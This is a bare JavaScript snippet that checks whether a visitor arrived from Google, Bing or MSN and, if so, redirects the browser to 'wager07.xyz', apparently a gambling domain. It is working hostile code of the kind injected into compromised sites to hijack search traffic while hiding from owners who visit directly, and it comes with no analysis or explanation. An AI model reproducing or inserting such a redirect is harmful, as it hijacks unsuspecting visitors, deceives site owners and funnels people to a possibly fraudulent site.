var regexp=/\.(google|bing|msn)(\.[a-z0-9\-]+){1,2}\//ig;
var where =document.referrer;
if(regexp.test(where))
{
window.location.href='http://wager07.xyz'
}
